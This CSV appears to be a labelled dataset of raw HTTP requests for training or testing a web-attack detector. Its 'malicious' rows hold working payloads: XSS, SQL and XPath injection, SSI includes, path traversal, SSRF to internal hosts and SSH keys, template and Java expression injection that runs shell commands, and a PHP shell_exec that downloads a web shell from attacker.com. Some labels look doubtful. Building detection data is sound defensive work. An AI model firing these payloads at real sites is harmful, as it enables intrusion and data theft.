label,text
malicious,"POST /profile_edit HTTP/1.1
Host: urban-lifestyle-guide.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.5
Origin: https://urban-lifestyle-guide.io
Cache-Control: max-age=0
Content-Length: 66

description=Foodie%20and%20traveler.%20%3C!--#include%20fIlE%3D%22%2Fetc%2Fmotd%22--%3E"
benign,"PUT /api/v1/upload_documents/visa_passport HTTP/1.1
Host: trusted-doc-verify.org
Content-Type: application/octet-stream
User-Agent: curl/7.85.0
Accept: */*
Content-Length: 200
Connection: keep-alive
X-CSRF-Token: e37sdZAzO7xk4sYr8HgRgSNkVpPLbMnE
Authorization: Bearer eyJraWQiOiJyb290X2tleSJ9.signature
Referer: https://trusted-doc-verify.org/user/dashboard

RG9jdW1lbnQgYmFzZTY0IGVuY29kZWQgdXBsb2FkIGNvbnRlbnQgc3RyaW5nIGZvciB2ZXJpZmljYXRpb24g"
malicious,"GET /search?q=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: portal-secure-web.io
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.7
Referer: https://portal-secure-web.io/homepage
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
malicious,"GET /user/account HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Cookie: session_filter=(account=privileged%00;"
malicious,"POST /member/profile HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: https://my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml
Cookie: user_session=4f91a1b0c68d2e8a6f6e

name=Sara&user_bio=<!--#include virtual=""/var/log/nginx/access.log"" -->"
malicious,"POST /orders/submit HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.77.0
Accept: */*
Referer: https://trusted-content.my-personal-blog-site.info/articles/special-offer
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Cookie: csrftoken=5f2b7b418a3c4580b71d0cf48f8ffe21

product_id=1234567&quantity=1&payment_method=card"
benign,"GET /reviews/latest-smartphones-2024 HTTP/1.1
Host: tech-review-hub.com
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml
Accept-Encoding: br, gzip
Referer: https://tech-review-hub.com/reviews/
Connection: keep-alive"
benign,"GET /api/v2/products/electronics/laptops?sort=rating&available=true HTTP/1.1
Host: urban-electro.store
Accept: application/json
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36
Connection: keep-alive
X-Requested-With: XMLHttpRequest
Referer: https://urban-electro.store/electronics/laptops"
malicious,"GET /app/user/settings HTTP/1.1
Host: localized-content-deliverer.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://localized-content-deliverer.net/app/home
Cookie: lang_pref=../../../../etc/passwd%00en-US
Connection: keep-alive"
benign,"HEAD /media/movies/feature_film_1080p.mkv HTTP/1.1
Host: streaming-media-content.org
User-Agent: curl/7.85.0
Accept: */*
Connection: close
Range: bytes=0-0"
malicious,"GET /xml_api/search_books?book_title=Harry%20Potter%27%20or%20%271%27%3D%271 HTTP/1.1
Host: library-archive-services.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /reports/quarterly/2024/Q2 HTTP/1.1
Host: finance-market-trends.ai
User-Agent: Mozilla/5.0 (Linux; Android 10; Mi 10T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/pdf,application/xhtml+xml
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"PUT /v1/upload/avatar HTTP/1.1
Host: media-upload-service.infostore.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept-Language: en-US,en;q=0.5
Accept: application/json
Content-Type: application/json
Content-Length: 72
Origin: https://user.media-upload-service.infostore.io
Connection: keep-alive

{""avatarSource"":""http://0x7f000001:3000/internal/api/check?session=active""}"
benign,"POST /files/upload HTTP/1.1
Host: client-portal.finance-datahub.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 369
Origin: https://client-portal.finance-datahub.co
Referer: https://client-portal.finance-datahub.co/dashboard
Cookie: sessionid=346274bd1ac8f234b1e2fc22f9a3c79d; secureflag=1

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""document""; filename=""report_final.pdf""
Content-Type: application/pdf

%PDF-1.4
%âãÏÓ
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""title""

Quarterly Financial Report
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""category""

Finance
------WebKitFormBoundary7MA4YWxkTrZu0gW--"
benign,"GET /api/v1/events/upcoming?city=seattle&days=10 HTTP/1.1
Host: citylife.eventsinfo.org
Accept: application/json
X-Forwarded-For: 203.0.113.27
Accept-Encoding: gzip
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.e30.9a5Z-plMFSVOscN8L3wwCdSKhU-sJdxp6PwtZ5iMnk0
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: data-analytics-suite.co.uk
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: text/plain
Content-Length: 40
Accept-Language: en-GB,en;q=0.5
Cookie: analytics_sid=mnop3456qrst7890uvwx
If-Match: ""5d8c72a7-562f-4bde-9841-7d104c5c6d1f""

Corrected data entry with latest quarterly metrics."
benign,"HEAD /index.html HTTP/1.1
Host: tech-support-dashboard.io
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: */*
Connection: close
If-None-Match: ""b7c3d4e59a18ef1c"""
benign,"PATCH /api/v1/vehicles/12345 HTTP/1.1
Host: fleet-manage.services
Authorization: Bearer 9f8e7d6c5b4a3z2x1y0w
Content-Type: application/merge-patch+json
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: application/json
Content-Length: 28

{""last_service_date"":""2024-05-25""}"
benign,"PUT /members/janedoe/profile HTTP/1.1
Host: user-connectivity.zone
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 57
Authorization: Bearer mF_9.B5f-4.1JqM
Connection: keep-alive

{""bio"": ""Enthusiast of &lt;strong&gt;coding&lt;/strong&gt; and open source.""}"
benign,"POST /v2/devices/update-state HTTP/1.1
Host: iot-cloud-connector.net
Authorization: Bearer eyJhbGc9IjMyM0NkIn0.AbcXyzBtSu7
Content-Type: application/json
Content-Length: 54
Idempotency-Key: d4e90ea2-c8ef-4f1a-adac-b2ac5527a022
X-Request-ID: 6713b016-478c-41b7-b407-e071a30d9ab1
X-Client-Version: 4.4.2
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Safari/537.36

{""deviceId"":""dev-8891"",""state"":""active"",""batteryLevel"":87}"
benign,"POST /player/chat/send HTTP/1.1
Host: realm-multiplayer-online.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.8
Content-Length: 40
Connection: keep-alive
Referer: https://realm-multiplayer-online.net/game/session/12345

message=%2Fsay+Attack%21+Onwards%2C+team%21%21%21"
malicious,"GET /live/support/chat?session=94211 HTTP/1.1
Host: realtime-support-service.org
X-Forwarded-Host: evil-tracking-domain.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"POST /account/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 92
Referer: https://secure-user-portal.net/account/settings
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Cookie: sid=YU89tiV7l; path=/; HttpOnly
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: close

display_name=GreenLeafGardener&bio=Passionate+about+sustainable+gardening.&website_url=https%3A%2F%2Fgreenleafgarden.blog&location=Austin%2C+Texas"
malicious,"POST /api/v1/validate HTTP/1.1
Host: nextgen-cloud-solutions.net
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Sec-CH-UA: ""Chromium"";v=""90"", ""Google Chrome"";v=""90"", "" Not A;Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
Cache-Control: no-cache

{
  ""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""
}"
benign,"GET /recipes/search?query=how%20to%20bake%20bread HTTP/1.1
Host: domestic-chef-resources.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"DELETE /api/v3/posts/f4e2b19d-7a43-41bc-ae85-1e239a3c8003 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2xhaXJlIn0.iLyCRG5Qt8oMFIdu-Au5qk_vyuuQKIuQhrb0oyhUg5k
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Connection: close"
malicious,"POST /user/submit-feedback HTTP/1.1
Host: feedback-panel.it-solutions.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 133

name=Jessica+Moretti&email=jessica.moretti%40mail.it-solutions.biz&feedback=Great+site%21+%3C%3Fphp+echo+shell_exec%28%27wget+http%3A%2F%2Fattacker.com%2Fshell.php+-O+/tmp/sh.php%27%29%3B+%3F%3E"
malicious,"POST /api/user/authenticate HTTP/1.1
Host: secure-login-hub.net
Content-Type: application/json
Content-Length: 98
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
X-CSRF-Token: 4f9d3a7e-1b29-4c8a-9f0b-7d2a5c6e8f9b

{""username"":""adminUser"",""password"":""password' Or '1'='1""}"
benign,"GET /resources/gifs/spinner-waiting.gif HTTP/1.1
Host: nextgen-webservices.org
Accept: image/gif,image/*;q=0.9
Referer: https://nextgen-webservices.org/user/profile
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Via: 1.1 varnish"
benign,"POST /profile/update HTTP/1.1
Host: user-portal-nextgen.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: application/json, text/plain, */*
X-CSRF-Token: f3c28a8772c0b9f174cdad6a49207154
Content-Length: 92
Connection: keep-alive

message=I+did+a+quick+DELETE+test+on+a+temporary+table+to+make+sure+the+syntax+was+right."
malicious,"GET /xml_api/search_books?book_title=Networks%27%20or%20%271%27%3D%271%20or%20string-length(//users/user[1]/password)%20%3E%200 HTTP/1.1
Host: global-tech-resources.co.uk
User-Agent: Wget/1.21.1
Accept: */*
Accept-Encoding: gzip
Referer: https://global-tech-resources.co.uk/xml_api/home
Connection: close"
benign,"GET /api/v1/events/upcoming?limit=10 HTTP/1.1
Host: api.live-events-platform.cloud
Accept: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJldmVudHNfaWQiOjc4OX0.yornDyfUtl5-CIuGYvSEx70Bm9AA4FxPYiwDaH03-r8
Origin: https://live-events-platform.cloud
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:79.0) Gecko/20100101 Firefox/79.0"
benign,"POST /survey/submit_vote HTTP/1.1
Host: online-anime-community.info
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0
Referer: https://online-anime-community.info/survey
Accept-Encoding: gzip, deflate
Cookie: session_token=ab12xyz890pkj45mnq

poll_id=18&vote_option=2"
benign,"GET /api/v1/user/actions?exec_action=refresh_cache HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
User-Agent: curl/7.79.1
Accept-Encoding: gzip, deflate"
malicious,"POST /api/user/edit HTTP/1.1
Host: member-zone-cloud.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
Cache-Control: max-age=0
Content-Length: 88
Connection: keep-alive

account=freeuser&status=active&account=premium&status=disabled&message=welcome&message=%3Cscript%3Exss%28%29%3C%2Fscript%3E"
malicious,"GET /fetch/file%3A%2F%2F%2Froot/.ssh/id_rsa HTTP/1.1
Host: media-streaming-hub.tv
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /members/signup HTTP/1.1
Host: digital-archives-library.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: https://digital-archives-library.net
Referer: https://digital-archives-library.net/members/new
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Cookie: sessiondata=473928fjkdfj839sl200jd1839
Pragma: no-cache
Connection: keep-alive

username=linda_hays&email=linda.hays%40darchives.net&password=Archiv3r!2024&password_confirm=Archiv3r!2024&terms_accepted=true"
benign,"OPTIONS /resources/items/2201 HTTP/1.1
Host: logistics-tracking-service.io
Origin: https://tracker.shipmenthub.biz
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: */*
Connection: keep-alive"
benign,"GET /feeds/rss.xml HTTP/1.1
Host: creative-artists-hub.com
Accept: application/rss+xml
User-Agent: AppleNews/3.0.0 (iPhone; iOS 15.4; Scale/3.00)
Referer: https://creative-artists-hub.com/gallery
Accept-Language: en-US
Connection: keep-alive"
benign,"PUT /users/70123/preferences HTTP/1.1
Host: fitness-tracker-app.net
Authorization: Bearer a1b2c3d4e5f6g7h8i9j0klmnopqrstuv
Origin: https://app.fitness-tracker-app.net
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Connection: keep-alive
Content-Length: 110

{""dailyStepGoal"":10000,""notifications"":{""activityReminders"":true,""weeklySummary"":true},""privacySettings"":{""shareLocation"":false,""shareWorkouts"":true}}"
benign,"POST /session/end HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Referer: https://online-retail-store.biz/account/settings
Cookie: session=dc43b96075ef091a
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Content-Length: 34
Connection: keep-alive

csrf_token=pt382YD9sdfs8skdLs3Kd33F"
benign,"GET /assets/webfonts/proxima-nova-semibold.woff2 HTTP/1.1
Host: digital-marketing-studio.co
Accept: font/woff2,application/font-woff2;q=0.8,image/webp,*/*;q=0.6
Referer: https://digital-marketing-studio.co/css/base.css
Origin: https://digital-marketing-studio.co
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Connection: keep-alive"
malicious,"POST /account/filters/validate HTTP/1.1
Host: advanced-filters-service.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
Cache-Control: no-cache
Pragma: no-cache
Connection: close

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ"
malicious,"GET /oauth/authorize?redirect_uri=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://community.game-dev-forum.org/login
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
malicious,"POST /v2/profile/update HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: text/plain
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip, br
Accept-Language: en-GB,en;q=0.7
Content-Length: 99

user%5Bemail%5D=dana%40gamedevforum.org&user%5Badmin_access%5D=1&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=9&user%5Broles%5D%5B%5D=12"
benign,"OPTIONS /api/export/v6/session/43020/export HTTP/1.1
Host: data-exporter.toolsuite.cloud
Origin: https://app.toolsuite.cloud
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: python-requests/2.31.0
Accept: application/json
Connection: keep-alive"
benign,"GET /search-events?query=music+festivals+in+europe+2024+including+dates%2C+lineups%2C+and+ticket+price+ranges HTTP/1.1
Host: community-event-hub.eu
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Connection: close"
benign,"DELETE /api/v1/photos/album-77/image-2054 HTTP/1.1
Host: secure-photo-storage.io
Authorization: Bearer 42efb7a9d5c8f1b724a65a87ee834c5f
If-Match: ""etag-img-2054-v2""
Accept: image/webp,image/apng,image/*,*/*;q=0.8
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Via: 1.1 exampleproxy.com
Connection: keep-alive"
benign,"GET /products/books/classics HTTP/1.1
Host: world-bookmarket.org
Accept: text/html
Accept-Language: en-GB,en;q=0.7
Cookie: user_prefs_b64=eyJwYWdlIjoxLCJuZXdTaG93cyI6ZmFsc2UsImNvbnRlbnRMYXlvdXQiOiJyZWxheSJ9; user_token=abc123def456
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36
Connection: keep-alive"
benign,"POST /api/v4/books/add HTTP/1.1
Host: library-database.network
Content-Type: application/xml
Content-Length: 129
Accept: application/xml
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SPP4.220610.009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Mobile Safari/537.36
Origin: https://library-database.network
Connection: keep-alive

<book>
  <title>Understanding Robotics</title>
  <author>Simone Weber</author>
  <isbn>978-3-16-148410-0</isbn>
  <category>Technology</category>
</book>"
malicious,"POST /service/request HTTP/1.1
Host: devops-monitoring-hub.cloud
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Connection: keep-alive
X-Requested-With: XMLHttpRequest

fetch_url=gopher://127.0.0.1:6379/_%09PING%0D%0A"
malicious,"POST /user/settings/update HTTP/1.1
Host: account.management-portal.xyz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Content-Length: 89
Connection: keep-alive
Referer: https://account.management-portal.xyz/user/settings

email=user%40mail.com&notif=enabled&email=admin%40mail.com&notif=disabled&bio=%3Cscript%3Exss()%3C%2Fscript%3E"
benign,"OPTIONS /inventory/update-status HTTP/1.1
Host: inventory.online-retail-store.biz
Origin: https://seller-portal.marketplace.site
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization
User-Agent: curl/7.79.1
Accept: */*
Connection: keep-alive"
benign,"POST /api/v1/newsession HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer dc9ef5026c9f43f9894e167fa123d456
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Content-Length: 89
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<Session>
  <User>ProGamer77</User>
  <GameID>4312</GameID>
</Session>"
benign,"POST /auth/login HTTP/1.1
Host: tech-support-hub.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Accept-Language: en-US,en;q=0.8
Referer: https://tech-support-hub.io/auth
Origin: https://tech-support-hub.io
Cookie: token=a3s6d792nx93irc; csrf=834ufjs
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Connection: keep-alive

username=sarah_connor&password=TerminatorRun$2022"
benign,"GET /products/electronics/tv/details?id=ZX19KL87&review=The%20picture%20quality%20is%20exceptional%20with%20rich%20colors%20and%20deep%20blacks%2C%20sound%20is%20clear%20and%20immersive%20perfect%20for%20movie%20nights%20and%20gaming HTTP/1.1
Host: online-retail-store.biz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: curl/7.88.1
Connection: close"
benign,"GET /v1/library/books/featured HTTP/1.1
Host: api.modern-bookhub.info
App-Secret: f4c8a695e1bc493281abd5f72906d77f
Accept: application/json
User-Agent: Python-urllib/3.11
Cache-Control: max-age=120"
malicious,"GET /app/user/settings HTTP/1.1
Host: analytics.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://trusted.referrer.com/{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('uname -a').read() }} #}
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /api/v2/user/welcome HTTP/1.1
Host: api.dynamic-content-services.ai
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://app.dynamic-content-services.ai/dashboard
Origin: https://app.dynamic-content-services.ai
Cache-Control: no-cache
Cookie: sessionId=48f2e7d09b3c4a8f9d7bcd12e45a7c3e

{
  ""user_id"": 987451,
  ""custom_greeting"": ""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!"",
  ""locale"": ""en-US"",
  ""metadata"": {
    ""source"": ""mobile_app"",
    ""version"": ""5.3.2""
  }
}"
